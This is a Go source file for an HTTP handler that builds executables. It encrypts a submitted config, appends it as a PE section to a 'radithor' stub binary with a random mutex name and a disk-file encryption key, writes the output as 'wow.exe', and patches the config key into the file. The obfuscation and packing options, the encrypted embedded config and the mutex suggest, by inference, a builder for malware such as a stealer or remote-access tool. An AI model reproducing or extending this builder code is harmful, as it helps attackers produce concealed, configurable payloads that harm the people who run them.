package build

import (
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"net/http"
	"os"

	"radithor-builder/store"
	"radithor-builder/utils"

	"shared"
	"shared/config"

	"github.com/go-coff/peln/appender"
	"github.com/horobimasu/gotils"
)

var ignroedConfigs = []string{
	"end_to_end_encryption",
	"save_config",
	"obfuscate_site_title",
	"obfuscate_build",
	"pack_build",
	"tag",
}

func GenerateRadithorBuild(w http.ResponseWriter, r *http.Request) {
	radithorStubPath := utils.GetSameDirFilePath("radithor.bin")
	if radithorStubPath == "" {
		http.Error(w, "failed to find radithor stub", http.StatusInternalServerError)
		return
	}

	radithorConfigMapPath := utils.GetSameDirFilePath("radithor.cfgmap.json")
	if radithorConfigMapPath == "" {
		http.Error(w, "failed to find radithor config map", http.StatusInternalServerError)
		return
	}

	var rawBody map[string]any

	err := json.NewDecoder(r.Body).Decode(&rawBody)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to decode body - %v", err), http.StatusInternalServerError)
		return
	}

	decryptedBody := make(map[string]json.RawMessage)

	if store.SharedSecret != nil {
		for k, v := range rawBody {
			decrypted, err := gotils.DecryptAesGcm([]byte(v.(string)), store.SharedSecret)
			if err != nil {
				http.Error(w, fmt.Sprintf("failed to decrypt %s - %v", k, err), http.StatusBadRequest)
				return
			}

			decryptedBody[k] = json.RawMessage(decrypted)
		}
	} else {
		for k, v := range rawBody {
			value, err := json.Marshal(v)
			if err != nil {
				http.Error(w, fmt.Sprintf("failed to marshal %s - %v", k, err), http.StatusBadRequest)
				return
			}

			decryptedBody[k] = value
		}
	}

	marshalledBody, err := json.Marshal(decryptedBody)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to encode body - %v", err), http.StatusBadRequest)
		return
	}

	var reqBody map[string]any

	err = json.Unmarshal(marshalledBody, &reqBody)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to decode body - %v", err), http.StatusBadRequest)
		return
	}

	configIdData, err := os.ReadFile(radithorConfigMapPath)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to read radithor config map - %v", err), http.StatusBadRequest)
		return
	}

	savedDiskFilesEncryptionKey, err := utils.GenerateRandomBytes(32)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to generate encryption key for radithor disk files - %v", err), http.StatusBadRequest)
		return
	}

	mutexName, err := utils.GenerateRandomString(14)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to generate radithor mutex name - %v", err), http.StatusBadRequest)
		return
	}

	reqBody["DISK_FILE_DATA_ENCRYPTION_KEY"] = string(savedDiskFilesEncryptionKey)
	reqBody["MUTEX_NAME"] = mutexName

	var rawConfigIds map[string]uint

	err = json.Unmarshal(configIdData, &rawConfigIds)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to decode radithor config map - %v", err), http.StatusBadRequest)
		return
	}

	configIds := make(map[string]uint8, len(rawConfigIds))
	for name, id := range rawConfigIds {
		configIds[name] = uint8(id)
	}

	encoded, err := config.EncodeConfigs(reqBody, configIds, ignroedConfigs, store.DEBUG && store.DEBUG_PRINT_CONFIG_TYPES)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to encode radithor config - %v", err), http.StatusBadRequest)
		return
	}

	configEncryptionKey, err := utils.GenerateRandomBytes(32)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to generate encryption key for config - %v", err), http.StatusBadRequest)
		return
	}

	encryptedConfig, err := gotils.EncryptAesGcm(encoded, configEncryptionKey)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to encrypt config - %v", err), http.StatusBadRequest)
		return
	}

	radithorStubData, err := os.ReadFile(radithorStubPath)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to read radithor stub - %v", err), http.StatusBadRequest)
		return
	}

	newRadithorStub, err := appender.Append(radithorStubData, []appender.Section{
		{
			Name:            shared.RADITHOR_CONFIG_PE_SECTION_NAME,
			Data:            encryptedConfig,
			Characteristics: appender.DefaultCharacteristics,
		},
	})

	if err != nil {
		http.Error(w, fmt.Sprintf("failed to add config to radithor stub - %v", err), http.StatusBadRequest)
		return
	}

	newRadithorStubPath, err := utils.WriteToBuildsDir("wow.exe", newRadithorStub)
	if err != nil {
		http.Error(w, fmt.Sprintf("failed to write radithor build - %v", err), http.StatusBadRequest)
		return
	}

	utils.LogDebug("config encryption key: %x", configEncryptionKey)
	utils.LogDebug("encrypted config hash: %x", sha256.Sum256(encryptedConfig))

	gotils.ReplaceFileBytesFromLeading(
		newRadithorStubPath,
		shared.RADITHOR_RAW_ENCRYPTED_CONFIG_DATA_FINGERPRINT,
		append(shared.RADITHOR_RAW_ENCRYPTED_CONFIG_DATA_FINGERPRINT, configEncryptionKey...),
	)
}
